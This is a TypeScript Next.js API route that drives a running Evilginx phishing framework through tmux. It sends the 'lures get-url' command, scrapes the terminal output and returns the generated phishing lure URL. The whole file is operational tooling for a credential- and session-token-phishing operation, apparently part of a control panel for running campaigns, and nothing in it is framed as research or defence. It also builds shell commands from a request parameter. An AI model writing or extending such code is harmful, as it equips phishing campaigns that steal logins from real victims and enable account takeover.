import { NextApiRequest, NextApiResponse } from "next";
import { exec } from "child_process";
import { promisify } from "util";

const execAsync = promisify(exec);

export default async function handler(
  req: NextApiRequest,
  res: NextApiResponse
) {
  if (req.method !== "GET") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  // Set no-cache headers on the response
  res.setHeader(
    "Cache-Control",
    "no-store, no-cache, must-revalidate, proxy-revalidate"
  );
  res.setHeader("Pragma", "no-cache");
  res.setHeader("Expires", "0");

  try {
    // Get the lure index from the query parameters
    const { lureIndex } = req.query;

    // Validate lure index
    if (!lureIndex || isNaN(Number(lureIndex))) {
      return res
        .status(400)
        .json({ error: "Invalid lure index. Please provide a valid number." });
    }

    console.log(
      `Force executing evilginx command for lure index: ${lureIndex}`
    );

    // Check if the tmux session exists
    const { stdout: tmuxCheck } = await execAsync(
      "tmux ls 2>/dev/null || echo 'No tmux sessions'"
    );
    console.log("Tmux sessions:", tmuxCheck);
    const sessionExists = tmuxCheck.includes("ginx-0");

    if (!sessionExists) {
      return res.status(500).json({
        error:
          "Evilginx tmux session (ginx-0) not found. Please start evilginx first.",
      });
    }

    // First, clear the prompt by sending Enter and Ctrl+C
    await execAsync(`tmux send-keys -t ginx-0 C-c C-m`);
    await new Promise((resolve) => setTimeout(resolve, 500)); // Longer wait time

    // Clear the screen to make output easier to capture
    await execAsync(`tmux send-keys -t ginx-0 "clear" C-m`);
    await new Promise((resolve) => setTimeout(resolve, 500)); // Longer wait time

    console.log("Sending command to tmux session: lures get-url " + lureIndex);

    // Execute the command to get the URL - WITHOUT the timestamp comment
    // The timestamp in the URL parameter is enough to prevent API caching
    await execAsync(
      `tmux send-keys -t ginx-0 "lures get-url ${lureIndex}" C-m`
    );

    // Wait longer for command to execute
    await new Promise((resolve) => setTimeout(resolve, 1500));

    // Capture the output from the pane
    const { stdout: capturedOutput } = await execAsync(
      `tmux capture-pane -t ginx-0 -p`
    );

    console.log("Captured output:", capturedOutput);

    // Parse the output to find the URL
    const lines = capturedOutput.split("\n");

    // Look for the line with the URL - it should come after the "lures get-url" command
    let url = "";
    let foundCommand = false;

    for (const line of lines) {
      const trimmedLine = line.trim();

      // Skip empty lines
      if (!trimmedLine) continue;

      // Look for the line where the command was executed - including our timestamp
      if (trimmedLine.includes(`lures get-url ${lureIndex}`)) {
        foundCommand = true;
        continue;
      }

      // After finding the command, look for the URL in subsequent lines
      if (foundCommand) {
        // Skip error lines or info lines
        if (trimmedLine.includes("[err]") || trimmedLine.includes("[inf]")) {
          continue;
        }

        // The URL should be on a line by itself and start with http
        if (trimmedLine.startsWith("http")) {
          url = trimmedLine;
          break;
        }
      }
    }

    if (!url) {
      return res.status(500).json({
        error: "Could not find URL in command output",
        output: capturedOutput,
      });
    }

    console.log("Successfully found URL:", url);
    return res.status(200).json({ url });
  } catch (error) {
    console.error("Error executing evilginx command:", error);
    return res.status(500).json({
      error: "Failed to execute evilginx command",
      details: error instanceof Error ? error.message : "Unknown error",
    });
  }
}
